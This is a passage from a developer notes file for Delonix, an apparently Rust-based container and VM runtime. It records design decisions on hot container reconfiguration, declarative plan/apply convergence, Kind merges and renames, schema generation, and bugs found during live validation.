  (tiles, table, problems panel, TUI footer) moved to EN at source +
  new entries in `data/pt.po`; `docker-api`'s about-text (a pre-existing gap,
  unrelated to the dash) also gained a path translation.
- **Validated live on this host**: `dash --json`/`--once` (57s, including the
  full disk scan, correct); TUI starting up in seconds (no more than
  a minute) confirmed by the process state (`epoll_wait` at ~3s, not
  blocked on disk I/O); a real `delonix serve api` with `/metrics`
  (0.14-0.2s, expensive gauges filling in after the 1st background pass) and `/v1/dash` (full JSON, ~33s) over a real unix socket.

- `container ls` has the 7 columns of `docker ps`. **And lists what `docker ps` lists** (2026-10-11): without `-a`, only `Running` and `Paused` (`listed_without_all`, shared with the Docker API's `GET /containers/json`, which now honours `all`). Previously it hid only `Failed`/`Crashed`, so a `stop` or an exit with 0 stayed in the listing and an exit with 3 did not — and the battery check that expects a stopped container to leave the `ps` skipped every round. The same pass found the Docker API returning `"Ports": []`: its parser expected `hostPort:contPort` and the record has stored `addr:hostPort:contPort/proto` since 2026-10-07; it now reads with `parse_publish_addr`. The `Up …` comes from the init's `pid_starttime` and **not**
  from `created_unix`: a container created yesterday and restarted 5 min ago would show "Up 1 day" — false
  exactly when it matters (debugging a crash-loop).
- `fmt_duration_secs` ports docker's `units.HumanDuration` **to the letter**, buckets included (days
  up to 2 weeks, weeks up to 2 months). It is that choice of buckets — and not a special case —
  that prevents the "1 weeks" that the first version here printed.
- **`describe` is additive; the `inspect`s stay as they were.** `describe` = humans, `inspect` = JSON
  for scripts. It is a public CLI: migrating `volumes/network inspect` from text to JSON would be a
  breaking change and was not done.
- `stack describe` does not invent state: the stack **has no registry of its own**, so it starts from the
  manifest and goes to confirm the presence of each resource with the respective store (same philosophy as
  `cluster ls`, which derives from labels). Drift-detection exists since ADR-0088 (A5) and **reverts**
  the earlier note that it was "orchestrator work": `delonix drift` reports what the MACHINE
  changed since the last apply (`last-applied` stamp vs observed), `drift --correct` re-applies the
  manifest to reconcile, and a `kind: GitOpsSource` with `spec.driftPolicy: report|correct`
  lets the timer (systemd, ADR-0021) do it — opt-in and daemonless. Without `driftPolicy`, without `drift`
  by hand, the node behaves exactly as before.

## Hot reconfiguration (`delonix container update`)

`container update <id>` changes **ports, volumes, networks and bandwidth limit without stopping the container** —
the PID does not change. It is the fundamental difference from docker (where changing a port forces a recreate):
here the dataplane does not belong to the process life cycle. Flags: `--publish-add/--publish-rm`,
`--volume-add/--volume-rm`, `--net-connect/--net-disconnect`, `--net-rate/--net-burst/
--net-rate-clear`. **Removals run before additions**, so that `--publish-rm 8080 --publish-add
8080:9000` works in a single command.

This wired up engine APIs that had existed for a long time and **never had a single caller** —
`mount_live`/`unmount_live`, `attach_extra_container`/`detach_extra_container`,
`set_net_rate`/`clear_net_rate`. Because they had never been called, they had a bug that only surfaced
now (see below).

**Persistence**: each operation writes to the registry as soon as the dataplane confirms, one by one, via
`Store::update` (flock — the CRI is concurrent). There is no transactionality: if the third fails, the
first two are ALREADY applied in the kernel and a record written only at the end would be lying.

**Known limitations, by design**:
- `--net-connect`/`--net-rate` require `--net <rede>`: the veth and the shaping live in the holder's netns,
  which the slirp-per-container path (`--net host/none`) does not have.
- `--publish-add` on a container created **without `-p` and without `--net <rede>`** is impossible: the
  slirp api-socket is only opened when `run` carries ports (`slirp_attach`). Explicit error.

**BUG FIXED while wiring this** (`mount_live`/`unmount_live`): they gated the `setns(user)` on
`container.userns`, but that field says whether the container **created** its own userns — the ones from
rootless ingress **inherit** the holder's and end up with `userns=false` despite being in a different userns
from ours. Without the setns, the subsequent `unshare(NEWNS)` gave EPERM and **all** hot
mounting failed (code 124). It is the same bug that `exec` once had and fixed — they now always open the
`user` ns and let the skip-by-inode of `open_container_ns` decide. Lesson to retain: **`container.
userns` is not "is in a different userns from mine"**; never use it for that question.

## Native IaC: `stack plan`/convergent `apply`/`destroy` (v0.47.0)

Request: make Delonix's IaC acceptable to the community **without being Terraform or Ansible** — so that
neither is required. The review that motivated it is in
[docs/discovery/47_IAC_REVISAO.md](docs/discovery/47_IAC_REVISAO.md).

**The structural defect this closes**: `apply` only ever created. An existing resource printed
`already exists, nothing to do` and the command returned **0** — changing the image in the manifest did
nothing and reported success. A declarative twin of the dishonest reporting that v0.37.0 removed from the
imperative CLI, and worse, because the user changed the file on purpose. It is aggravated by the fact that the
capability was already here: `cmd_update` reconfigures ports/volumes/networks/memory/CPU **hot without
changing the PID** and the declarative path never called it — 5th occurrence of the
`mount_live`/`set_net_rate`/`update_limits`/`JsonStore::update` pattern.

- **`cmd/reconcile.rs` is PURE** — it receives the two already-read sides, returns `Vec<Change>`; it never opens
  a store nor runs a command. That is what makes the cases that matter testable as data.
- **3-way diff.** The last applied spec lives on the RESOURCE ITSELF
  (`delonix.io/last-applied`, kubectl's mechanism in kubectl's place) — **no state
  file**, consistent with what the project has already published. It is the 3rd side that distinguishes "you removed the field
  from the file" (reverts) from "someone set this by hand" (does not touch).
- **Ownership by label** `delonix.io/stack` (same idiom as `POD_LABEL`/`COMPOSE_PROJECT_LABEL`).
  A resource created by hand is `Adopt` (dispenses with an `import` command); one from another stack is `Conflict` and
  is never touched; and neither `--prune` nor `destroy` see what does not have the label.
- **Fail-closed on recreation**: `-/+` names ALL the cold fields and `apply` refuses without
  `--replace <Kind>/<nome>`, before the first creation (apply is fail-fast with no rollback — refusing
  midway would leave the stack half-converged AND in error). `--prune` never by default, and runs
  LAST. `destroy` uses the REVERSE order of `KINDS`, **derived** and not written a 2nd time.
- **`--detailed-exitcode`** (0/2/1) — the `terraform plan` contract, for a drift gate in CI; a
  plan with a `Conflict` exits **5** (`DX-5601`, the `apply` error) and wins over 2.
  `plan` plans with the flags of `apply`: without `--prune`, a `Delete` is listed but
  **kept** (`changed: false`, outside the exit code — `mark_unpruned`); `plan --prune` counts it.
- **Scope: 12 of the 13 Kinds converge** (`CONVERGING_KINDS`) — Network/NetworkRoute/Volume/
  ShareVolume/Image/VirtualMachine/Container/Pod/NetworkPolicy/HTTPRoute/Ingress/Gateway. **This
  line has already been wrong twice** (it said 8, then 11 of 12 when `KINDS` already had 13, and
  then used the names `Vm`/`FirewallPolicy`/`Tunnel` that v0.64.0 turned into aliases — see "The Kinds
  gain groups and definitive names" below) — the
  authoritative list is the constant, and `stack plan --fields` prints it.
  **Only `Secret` stays** at "ensure present", and for a reason that is not inattention: the state
  are encrypted values, and a plan does not decrypt them to compare. The plan marks it `!` — **never
  omits it** (a plan that hides a resource reads as "no changes") — and `--fields` states the concrete
  obstacle, because "does not converge yet" reads as "no one got there". `Cluster`
  stays outside `KINDS` itself for being a remote procedure and not a local resource.
- **Two new gates, and each was born of a Kind that slipped through.** The three-lists test required
  the generic reason for the CONVERGING ones and never the specific one for the others — that is how
  `NetworkRoute` got in, applied and validated but outside `CONVERGING_KINDS`, printing `!` with a
  phrase that reads as "no one got there" when what was happening was an EXCEPTION to the isolation
  between networks that the manifest could not close. Now a Kind either converges or writes the
  obstacle. The sibling gate (`TEARDOWN_KINDS`/`no_teardown_reason`) requires that a converging Kind
  have teardown or say why — otherwise `--prune` promises it and `destroy_one` refuses it **midway**,
  after having already removed the rest in teardown order.
- **`Desired.ownable`** separates "converges" from "is ownable". An `Image` is a shared cache with
  content address (the same `alpine:latest` serves every stack — stamping it for one and
  removing it when that one stopped declaring it would pull it out from under the others); a `FirewallPolicy`
  and a `ShareVolume` have no registry of their own to stamp. The three converge and none is
  adopted or pruned. Without this distinction, an ownerless resource appeared as `Adopt` in ALL
  plans — measured, not supposed.
- **Three lists of converging Kinds have to agree, and drifted once.** The
  `CONVERGING_KINDS` decides three things (whether `actual_of` probes presence, whether
  `converge_and_stamp` applies, whether it stamps) and the `match` arms and the `--fields` table are
  written separately. Vm/FirewallPolicy/ShareVolume gained an adapter and stayed outside the constant,
  so they were SKIPPED — and the symptom hid because the old `apply` of each Kind is idempotent
  and converged by the wrong path. There is now a test requiring the three to agree in both directions.
  **And the lists ceased to exist** (v0.53.x): there were SIX, each beside what consumed it —
  `KINDS` (apply order), `CONVERGING_KINDS`, `TEARDOWN_KINDS`, `kind_honors_namespace`, the
  `DECLARATIVOS` of the `wait` test, and the arms of `presence()`. They now come from ONE table,
  `cmd/kinds.rs` (`KindFacts`: domain, shape, in_stack, converges, teardown, namespaced,
  presence), one row per Kind. The three defects that motivated it are of the same family and are in the
  module's doc-comment: the adapter above, the `NetworkRoute` applied during versions with no arm in
  `presence` (the `ls` calling "unsupported kind" a resource that apply creates), and the declarative ones
  that `wait` read as absent. **A classifier is only worth something if it governs something**: the
  `ownable` was deliberately left OUT — it is decided inside each `desired()`, which needs
  a document to run, so a copy in the table would be the seventh list with nothing forcing it to
  match. For the same reason there is no `is_declarative(kind)`: `wait` decides by the marker that the
  store RETURNED (`-`), not by what the table says it should return.
- **The field of actuation became visible** — a `DOMAIN` column in `stack ls`/`describe` and in the
  `--fields` table (`compute`/`storage`/`net-conn`/`net-policy`/`net-exposure`/`artifact`/
  `composition`), plus a full catalogue at the end of `stack plan --fields` with the SHAPE of each
  Kind (`primary`, `sugar → X`, `deprecated → X`, `compat → X`, `aggregate`). The three network ones are
  separated on purpose: a single `network` would hide that `NetworkRoute` opens a PATH and
  `FirewallPolicy` decides whether traffic is PERMITTED on it — the two questions in series that this
  engine refuses to merge. The SHAPE is the column you cannot guess from each Kind's doc: it says whether the
  document survives the `load`, which is the answer to "why does my `kind: Egress` never
  appear in the plan by that name".
- **The `Storage` being outside the schema's `TYPED_KINDS` is DELIBERATE, not a gap** (I recorded it as a
  gap in an analysis and was wrong): it has no spec of its own — it is rewritten to `kind: Volume` — and
  `no_typed_schema` already carried the targeted hint. What was missing was the gate: nothing required the same of the
  NEXT schema-less Kind, which would answer "no typed schema for X", read as a defect of the manifest
  when it is a property of the Kind. `untyped_hint` + `todo_kind_conhecido_tem_schema_ou_dica`, the same
  requirement that `not_converged_reason` and `no_teardown_reason` already make.
- **Normalization is the critical point**: if the two sides do not produce the same string, everything appears
  as drift forever. The compared set is conservative, each Kind has a test proving that an
  unchanged manifest yields ZERO differences, and **`stack plan --fields`** says what is compared and what
  is not and why (`env`/`command` come merged with those of the image, `user` is stored as a uid).
- `mount_to_spec` is the inverse of `resolve_spec` on purpose — the latter **creates** the volume, and computing
  a plan cannot create anything.
- **The `metadata.labels` of a `Network` and of a `Volume` reach the registry and converge (2026-10-03).** Only the `Container` received them: a network or a volume applied by manifest was left with the ownership stamp and nothing else, without warning. Now they are the plan's `labels` field (canonical JSON, `reconcile::user_labels_field`), hot: changing or removing a label converges without recreating. The `delonix.io/…` keys belong to the engine and stay out of the field; a manifest without labels does not touch hand-set labels. `network describe` and `volume describe` now show the labels. The `VirtualMachine` had the same defect (measured) and took the same fix: `labels` is its ONLY hot field (`vm::converge`), so changing a label neither recreates the machine nor touches the guest, and `describe vm` shows them.
- **`Volume`/`Network` gained `labels`/`annotations`** (`#[serde(default)]`, old records
  remain valid). The `Network` is not serde — it is `key=value` with several writers, so
  `set_metadata` rewrites LINE BY LINE (the idiom of `add_overlay_peer`) and promotes a legacy record
  (bare octet) to `base=<n>`; a value with a newline is **refused** (it would break the record into two lines).

**Schema GENERATED from the code (ADR-0007)** — `delonix schema print` + `delonix explain
Container.ports`, published in `docs/schema/v1/delonix.json` with a test guaranteeing it IS the generated one.
`schemars` is the **2nd deliberate exception** to the no-new-dependencies rule (after `ratatui`),
confined to the `-bin` and, since P2c of ADR-0040, to `delonix-compute` — the Pod spec types derive the schema beside their definition, which is what prevents the published schema from diverging from them; ADR-0040 puts the generated schema in the contexts layer. The mechanism crates stay dep-clean (`cargo tree -e normal -p <crate>`: neither `schemars` nor `ratatui` appears in any adapter or foundation). The schema is as strict as
the engine (`additionalProperties: false`, to catch the typo in a field name), but the list of
accepted ones comes from the SAME `*_SPEC_FIELDS` as `warn_unknown_fields`: the Container's grouped shape
is hoisted before `ContainerSpec` exists, and deriving the strictness solely from the struct would flag
correct manifests — a false positive, worse than the gap.

**REAL BUG caught while validating `examples/` against the schema**, in a published example:
`env: { POSTGRES_PASSWORD: dev }` (the shape anyone coming from compose writes) was accepted
and **silently discarded** — the Postgres of `examples/dependency.yaml` started up without a password.
The grouped shape is now identified by its keys (`vars`/`files`/`secrets`/
`secretFiles`), and a plain mapping becomes `["K=v"]`.

**5th merge: `ShareVolume`→`share:` block of `kind: Volume` (v0.53.x).** It is the one that was flagged
as a candidate and the reason is stronger than tidiness: **a share WAS already a volume** — the
`apply_one` always called `VolumeStore::register_external` — and the adjacent `ShareRecord` was a
SECOND record of the same object whose only own field was `storage_ref`; mountpoint, quota,
alert and created were duplicated. Two records for one object is how the two come to
disagree, and that is what prevented ownership: the `delonix.io/stack` stamp lives in the `labels`, which only
the volume has. Closed: `Volume.parent` (`#[serde(default)]`) stores the parent, the `ShareRecord` ceases
to be written and is **absorbed on the next apply** — volume first, old record dropped
last, with the MOUNTPOINT preserved (recomputing it would change the directory beneath bytes already
written). The `kind: ShareVolume` loads with a warning, `storageRef` remains accepted as a spelling
of `share.from`. Gain measured live: `stack plan` proposes `Adopt`, the apply stamps ownership, and the
`destroy` removes the TWO homonymous shares **without touching the data** (the `remove_with` never touches an
external mountpoint — the guarantee was there, it just needed someone to reach it).
- **The identity of a share in the plan is `<ns>/<nome>`** (`scoped_plan_name`). The reconciler
  identifies by `(kind, name)` and a share is scoped by namespace — two tenants with a `db`
  is the isolation the feature exists to give. Without qualifying, the two are ONE resource: one
  appears as drift of the other in every plan, and a `--replace Volume/db` would destroy both.
- **`Volume` is the only Kind whose answer to "is it namespaced?" comes from the DOCUMENT** — hence
  `Namespaced::{Never, Always, PerDocument}` instead of a boolean. As `false`, the `load` would warn
  "namespace has no effect" on a share whose namespace decides the data directory: a wrong warning,
  which is worse than none.
- **Two bugs caught by validating and not by reading.** (1) `validate_graph` refuses duplicates by
  `(kind, nome)` and failed two homonymous shares in different namespaces; the key now includes
  the namespace **only** for the volume-with-share. **I recorded it as MY bug and it was not** —
  measured afterwards against the pre-merge binary: `stack apply` answered
  `ShareVolume 'bsh' declared more than once` and the plan printed `ShareVolume/bsh` TWICE for
  two distinct resources. In other words, two tenants with a share of the same name were **never**
  applicable by manifest — only through the API/CLI directly, which is what the
  `dois_namespaces_com_o_mesmo_share_nao_se_tocam` always proved. The merge, with the
  `scoped_plan_name`, is what makes the capability reachable declaratively. (2) `set_quota`
  treats the two arguments opposite to each other —
  `quota: None` REMOVES the cap, `alert_pct: None` PRESERVES the threshold — so converging only the
  `alertPct` would silently erase a quota that no one touched; `converge` now makes ONE
  call with what is not in the diff read from the registry.
- **Method note**: a test that called `apply_share` (which resolves `state_root()`) would write to the
  REAL state of the machine — it just did not because the parent volume did not exist there. The tests use
  `apply_one(&tmp, ...)`, like their neighbours.

**Kind merges (18 → 15).** `Egress`→`FirewallPolicy` (they shared the entire `FwDocSpec` struct),
`Dependency`→reduced sugar for `FirewallPolicy` in the `load` (merging by TARGET, because
several dependencies ACCUMULATE allows and one document per dependency would make the last erase the
earlier ones), `Storage`→`nfs:`/`cifs:`/`webdav:` block of `kind: Volume`. The old names load
with a warning. **The 4th merge was NOT done**: `kind: Container` with `spec.containers` is NOT a one-element
`kind: Pod` — the first creates a container called `<name>`, the second creates the netns `pod-<name>`
and calls it `<name>-c0`; rewriting would rename the container and break DNS, the
HTTPRoute backends and the cross-references. Only the deprecation warning stays. **A rule that the Egress merge
revealed**: the children of a `kind: Stack` are built INSIDE the `load` and do not go through the cycle,
so any reduction has to run in BOTH paths or a Stack group produces documents
that no handler claims.

**`FirewallPolicy`: two policies for the same (target, direction) are REFUSED** in
`validate_graph`. The `apply_fw_doc` replaces the rules of a direction, so the second erased those
of the first with both reporting success — and `validate` said "OK". Refuse and not merge (unlike
the Dependency): a Dependency declares the access of a peer and several sum up; a
policy declares the ENTIRE desired state of a direction, so two are two answers to the same
question.

**`vm convert` speaks to all the ecosystems** — `qcow2`/`raw`/`vmdk`/`vdi`/`vhdx`/`vhd`. This
engine does not gain a backend per product (VirtualBox does not coexist with KVM, vSphere/Proxmox are
remote APIs, Hyper-V is Windows), but an image built here is imported by all. **`vhd`
is `vpc` in qemu-img and `.vhd` in the file** — the only combination in which the format name and the
extension diverge, hence being two functions. `--compress` only in qcow2/vmdk, refused in the others
with the list instead of a qemu-img error. Validated with `qemu-img info` AND `file(1)`.
**VirtualBox/VMware Workstation remain to be done**: `VBoxManage`/`vmrun` do not exist on this host,
so a backend would be unvalidatable code.

**The VMfile's `vm build` was validated live for the first time** (`virt-customize` runs on this
host; the `/boot/vmlinuz` at 0600 blockage does not bite). Build in 13s from a local base, content
confirmed with `virt-cat`. A built image now INHERITS distro and kernel from the base when the
`FROM` is local — **inheriting half was measurably worse**: with the base's distro and the release being
the FROM ref, the column printed `debian/delonix-vm-base:debian-bookworm`.

**The manifest schema became STABLE** in `docs/cli-stability.md` (the opposite was declared —
the CLI more protected than the format that people put in git). New cross-cutting guide
in `docs/gitops.md` (plan in a PR, apply on merge, drift gate, and what to do when an apply
dies midway). `scripts/schema-diff.sh` compares field by field between two tags and exits 1 with
differences.

**`stack_converge` chaos scenario** (harness: 20/20), with **two** containers on purpose — the
second is the CONTROL, and proves that convergence touched only what the plan named. The first version
checked only that the PID did not change, and that **proves nothing**: an apply that does nothing also
leaves the PID intact. The assertions that count are that the record changed (`memory_max`) **and** the
following `stack plan --detailed-exitcode` has nothing to propose. Verified by the repo's rule, with the
two fixes reverted one at a time: without `container::converge` it fails at "reported success
without converging memory (64M)"; without `refuse_unallowed` it fails at "the refusal touched the container" — the
apply destroys it to recreate it with an image that does not exist, and leaves it without a PID.

## The Kinds gain groups and definitive names — `Gateway`, `VirtualMachine`, `KubernetesCluster` (v0.64.0, ADR-0020)

This section was missing from this file — found while auditing `cmd/kinds.rs` and noting that
`Gateway`, `KubernetesCluster` and the canonical name `VirtualMachine` appeared nowhere in the
AGENTS.md, even though the rest of the file documents with the same detail much smaller
renames (a single flag). Reconstructed from `git log -p`/`git show` of
`bins/delonix-runtime-bin/src/cmd/kinds.rs` and `cmd/manifest.rs`, against `docs/releases/archive/v0.md`, section v0.64.0
(the already-written public record) and confirmed live — it is not a hypothesis, it is what this session's binary
(`93ec5842`, v3.1.0, built with an isolated `CARGO_TARGET_DIR`) answers.

**It is neither dead code nor unfinished work from another session.** The three entries are part of
ONE closed and tested commit (`0b0a6ba3`, #127, 2026-08-27, a squash of two work sessions —
`38c4e28d` measured the cost with the first rename before multiplying it, `10b889cd` did the
remaining three), with its own release note (`docs/releases/archive/v0.md`, section v0.64.0) and a follow-up (#166,
2026-08-29) that fixed a real regression THIS change let through. They have been in production since
v0.64.0; today's v3.1.0 is the same table.

**What changed — groups by `apiVersion`, and four renames with a silent alias.** The groups
below are TODAY's `delonix api-resources` (`93ec5842`, v3.1.0) and not the snapshot of
`docs/releases/archive/v0.md`, section v0.64.0 — `Storage`/`ShareVolume` merged into `Volume` and `Egress` merged into
`NetworkPolicy` in a commit from the SAME day (`e3e3c272`, #128, already covered above in "Kind merges"),
and `Service`/`NetworkAccessRule` arrived later (their own sections further below):

```
core.delonix.io/v1alpha1             Secret · Stack
compute.delonix.io/v1alpha1          Pod · VirtualMachine · Container · Workload
networking.delonix.io/v1alpha1       Network · NetworkRoute · NetworkPolicy · NetworkAccessRule · Service · Dependency
gateway.delonix.io/v1alpha1          Gateway · HTTPRoute · Ingress
storage.delonix.io/v1alpha1          Volume
artifact.delonix.io/v1alpha1         Image · App
infrastructure.delonix.io/v1alpha1   KubernetesCluster
```

| before | now | module that serves it |
|---|---|---|
| `Vm` | `VirtualMachine` | `cmd/vm.rs` |
| `FirewallPolicy` | `NetworkPolicy` | `cmd/firewall.rs` |
| `Tunnel` | `Gateway` | `cmd/tunnel.rs` (the file kept the old name; the Kind did not) |
| `Cluster` | `KubernetesCluster` | `cmd/cluster.rs` |

Measured before touching anything, and the number decided the design: **284 sites** of a Kind's NAME were
string literals repeated in code (the 1st estimate, by regex, said 106 — off by nearly 3×, and only the
compiler with the tests gave the right number, over 4 passes because the first 3 came out
incomplete: `"X" | k::Y =>` patterns only caught the alternative glued to the `=>`, the TARGETS of a
reduction like `Form::Sunset(POD)` are Kind names like any others, and a constant
`#[cfg(test)]` midway through `manifest.rs` moved the "is test" boundary and left 53 sites after it
unmigrated). They became constants in `cmd/kinds.rs` (`pub(crate) const VM/GATEWAY/CLUSTER/…`, doc-comment
at the top of the file) and a `KIND_ALIASES` table in `cmd/manifest.rs` — see "Native IaC" above for the
same story on the side of a Kind's FACTS, which this restructuring closes on the side of the NAME.

**Silent alias, not deprecation** — the distinction is the same the rest of the file already uses for
`ShareVolume`/`Storage`/`Egress`: a rename does not change what the document MEANS, so there is
nothing for the author to migrate, and warning would train people to ignore warnings. A MERGE
(`Egress`→`NetworkPolicy`) continues to warn, because there the semantics changed. `KIND_ALIASES` is
case-insensitive (`vm`/`VM`/`Vm`/`VirtualMachine` all resolve to the same), and the alias holds EVERYWHERE
— loader, `explain`, `stack apply --replace` — not only in the `load`; v0.64.0 fixed a
concrete bug in which `explain Cluster` refused a name that the manifest itself already accepted.

**`kind: Container` was ANNOUNCED, not rewritten — and this corrected the initial text of the
ADR-0020 itself** (not the "Kind merges (18 → 15)" paragraph above, which was already right — it just used the
generic word "deprecation" for what is now a mechanism with its own name). The `docs/adr/
0020-cli-restructuring.md` said, in its first version, that `Container` would lower to a one-element
`Pod`, read directly from §3.3 of the specification, without confronting what this repo had already
measured. It is wrong and the code already knew why: a `Pod` ALWAYS builds a shared netns with the
members entering by `--pod` re-exec, and lowering a declarative `Container` gave it an extra netns holder
and a different network path — it is not a spelling step, it is changing the execution SHAPE
silently, of manifests that already run. Hence a new shape in `Form`, `Sunset(&'static str)`:
it survives the `load`, keeps its own `apply`, names the successor — distinct from `Sugar`/`Compat`, which
ARE rewritten. The warning comes out ONCE per load with the count, not one per document (a manifest with
twenty containers would be drowned). The `Form::Deprecated` variant that this mechanism replaced was
then REMOVED from the enum entirely, when the last three Kinds using it no longer needed
it — a variant with no constructor is dead weight that this repo's `-D warnings` does not let stay.

**Confirmed live in this session**, binary built from the `HEAD` of `origin/main` (`93ec5842`):

```
$ delonix stack plan --fields   # (tabela "All Kinds, by area of action", cauda)
VirtualMachine      compute        primary                                yes            registry
Container           compute        sunset → Pod                           yes            registry
Gateway              net-exposure   primary                                -              registry
KubernetesCluster   composition    primary                                -              not observable

$ delonix api-resources
virtualmachines      vm            compute.delonix.io/v1alpha1          VirtualMachine      true   compute   primary
gateways             gw            gateway.delonix.io/v1alpha1          Gateway             false  net-exposure  primary
kubernetesclusters   kc,clusters   infrastructure.delonix.io/v1alpha1   KubernetesCluster   false  composition   primary
```

`Gateway` is fully wired: `in_stack: true`, `converges: true`, `teardown: false` (reason
written — "a tunnel has no labels to stamp ownership on"), `Presence::Registry`; the
published `examples/tunnel.yaml` already uses `kind: Gateway` (with the comment explaining the swap) and
validates (`delonix manifest validate -f examples/tunnel.yaml` → OK). `KubernetesCluster` stays
DELIBERATELY outside `KINDS`/`stack apply` — `in_stack: false` — for being a remote procedure
over SSH on hosts that already exist, not a resource of this node; it is the same feature already documented in
"kubeadm Cluster" above, except that section still wrote `kind: Cluster` before this correction.

**Tested, not just compiled**: `cargo test` (release, this session's isolated `CARGO_TARGET_DIR`) —
`cmd::kinds::tests::*` (8 tests, incl. `nenhum_kind_aparece_duas_vezes`,
`o_destino_de_uma_reducao_existe` — which would catch a `Form::Sunset("Pod")` pointing to a Kind
that does not exist), `cmd::manifest::tests::a_renamed_kind_keeps_answering_to_its_old_name` (the four
old spellings resolve, with the two extreme casings) and the 39 `cmd::cluster::tests::*` —
**48/48 passed**. All `examples/*.yaml` validate except
`nas-vm-cloud-config.yaml` (a pre-existing and unrelated failure — it is a cloud-init fragment without
`apiVersion`, not a manifest; it is not a regression of this investigation).

**The groups of a `kind: Stack` come from the Kinds table (ADR-0045).** They used to be a hand-written `StackSpec`
beside the table, and they drifted: `NetworkRoute`, `NetworkAccessRule`, `Service` and `App`
were applied by `stack apply` and did not fit inside a Stack, the `Gateway` group was still
called `tunnels:`, and the `Workload` had no group. Now the `KindFacts.stack_group` column governs the
expansion, the unknown-field warning, the schema and the example — there is no second list. `workloads:` and
`dependencies:` are groups but lower in the `load` (a `Workload` child is lowered explicitly, because
the children of a Stack do not go through the top-level cycle); `Stack` and `KubernetesCluster` are not groups and
say why (`stack_group_absent_reason`, printed by `stack plan --fields`). `tunnels:` still
loads silently as the old spelling of `gateways:`. A Stack **has no state of its own, by
design** (same decision as "no state file"): it dissolves into its children and `--prune`/`destroy`
see them by the label `delonix.io/stack`. The schema types the interior of each group against the spec of the
Kind itself (the same schema, compared by equality in a test), and an item gained `labels:`/
`annotations:`, without which a `Service` inside a Stack had no way to select its
containers. A `Service` whose selector matches nothing is **not** a validation error — the selection is
dynamic, and refusing it would refuse a legitimate order; a `Pod` on an undeclared network is.

**Real follow-up, not hypothetical: `delonix get clusters` arrived broken in v1.0.0** (#166, `1cb7692c`,
2026-08-29). `KindFacts.plural` of `KubernetesCluster` is `kubernetesclusters` — the
literal pluralization that all the other Kinds follow — but the embedded manual and the v0.69.0 migration notes
promised exactly `get clusters`/`delete clusters` as the replacement for the removed `cluster ls`/`cluster
delete`. Reported live against the published binary: `delonix get clusters` answered
"no such resource kind 'clusters'". Fixed by registering `"clusters"` as a SHORTNAME (keeping
`kubernetesclusters` as the canonical plural, so as not to break the ADR-0005 promise that a Kind
renamed keeps answering to the old name) — confirmed live in this session (`delonix get
clusters` lists, instead of refusing, a local `kind` cluster already running on this host — it is not a
fixture created for this test, it is real state left by another session). The same investigation
found and fixed two obsolete checks in `scripts/e2e.sh`/`scripts/install.sh` (`cluster ls`,
extinct since before B7; `completion bash`, extinct since the `completion shell <shell>` of
v0.67.0 — the installer was silently registering an empty completion file on every new
installation).

**What remains to be fixed, outside the scope of this section**: `docs/cli-stability.md:281-282` still lists
`Vm`/`Cluster`/`Tunnel` as the names of the Kinds that "do not yet have X" (they are valid aliases, but are no longer
the canonical name); it is the same class of drift that this section closes here, just in another file, and
was not touched in this pass so as to keep the scope within what the task asked.

Multi-document declarative manifest, Kubernetes-style (`apiVersion: delonix.io/v1` /
`kind` / `metadata.name` / `spec`), for the 5 Kinds with a CLI group: `Network`/`Volume`/
`Image`/`Vm`/`Container`. Central parsing in `cmd/manifest.rs` (`serde_yaml`, only in this binary —
it does not enter any mechanism crate). Each group (`cmd/{network,volume,image,vm,
container}.rs`) has its own typed `spec` (`NetworkSpec`, `VolumeSpec`, ...) and a function
`pub fn apply(docs: &[ManifestDoc])` that filters its Kind and applies.

**`kind: Workload` (ADR-0001, `docs/adr/0001-workload-kind-schema.md`)** — the beginning of the
Runtime Abstraction Layer: ONE declarative object for the two types of compute.
`spec.type: container|vm|pod` + a block named by the type (`spec.container`/`spec.vm`/`spec.pod`)
that is EXACTLY the `ContainerSpec`/`VmSpec`/`PodSpec` of the standalone Kind (it does not redefine a single
field, so it cannot diverge). **Sugar that lowers in `manifest::load`** — a `kind: Workload` is
rewritten into a synthetic `kind: Container`/`kind: Vm`/`kind: Pod` (inherits `metadata`) and follows the normal
per-Kind apply, just like a child of `kind: Stack`; the Workload does not survive the load, so
`apply`/`stack apply`/`--dry-run`/`ls`/`describe` and the per-Kind `apply -f` see the child with NO new
wiring. `cmd/workload.rs` (`lower_workload`, pure/tested) + the branch in `load()`. **Fail-closed**: the
type has to bring exactly its block (the other two absent, otherwise a mismatch error); an unknown/missing
type → clear error. **`type: microvm` (ADR-0006, `docs/adr/0006-workload-type-
microvm.md`)** lowers to `kind: Vm` with the **backend forced to `cloud-hypervisor`** (the microVM
VMM) — `spec.microvm` is a `VmSpec`; a block asking for another backend (e.g.: `backend: libvirt`)
is a contradiction and gives a targeted error (`force_microvm_backend`, injects/validates the backend in the raw `Value`
before deserialization). It needs CH installed + an image that boots in CH (not the golden k8s,
which is libvirt-only) — fail-closed on boot if it is missing. There are no longer reserved types. Zero new engine,
zero daemon, zero dependency (all in `-bin`). Validated live (dry-run + real apply of container/
pod; microvm injects the backend and refuses the conflict; fail-closed paths in EN and PT). See
`examples/workload.yaml`.

**`delonix workload {ls,describe,stop,rm}` (ADR-0002, Phase 2a, `docs/adr/0002-compute-driver-trait.md`)** —
the IMPERATIVE/day-2 side of the unification (creation is declarative, via `kind: Workload`). A trait
`ComputeDriver { list, owns, stop, remove, describe }` (`cmd/workload.rs`) with adapters `ContainerDriver`/
`VmDriver` that delegate to `cmd::{container,vm}::workload_*` — thin wrappers over the already-tested
list/describe/stop/rm logic of the engines (zero duplication, zero mechanism crate touched). `workload
ls` shows containers AND VMs in a single table (TYPE/NAME/STATUS/INFO); `describe`/`stop`/`rm` do
routing by EXACT name, **fail-closed**: zero owners → `no such workload`; a container AND a vm with the same name →
`ambiguous` (points to the specific command, never guesses). `owner()` is pure over the list of
drivers, tested with fake drivers. The trait was made with a real consumer on purpose (not dead
scaffolding — the "code waiting for the 1st caller" anti-pattern of the `revisor`): every method has a
caller. **`ensure`/create is left out** — creating is `kind: Workload`. **Phase 2b (promoting the trait
to the `core` or a `delonix-compute` crate) only when there is a 2nd consumer** (cri/mgmt) — not
before. Single-line output, mirroring the native subcommand (container→id, vm→name).

**Approach to k8s (4 slices, all in main).** (1) **`kind: Container` Pod shape** —
`spec.containers[]` (k8s) with `env:[{name,value}]`/`ports:[{containerPort,hostPort}]`/`resources.
limits`/`securityContext`/`volumeMounts`+`volumes`, normalized to the internal `RunOpts`
(`container::pod_to_run_opts`); v1 = 1 container (>1 error), the FLAT shape continues (back-compat),
detected by `spec.containers` present. (2) **`kind: Stack`** groups resources in a single doc
(`spec.{networks,volumes,storage,secrets,images,vms,containers,ingress,egress,firewallPolicies,
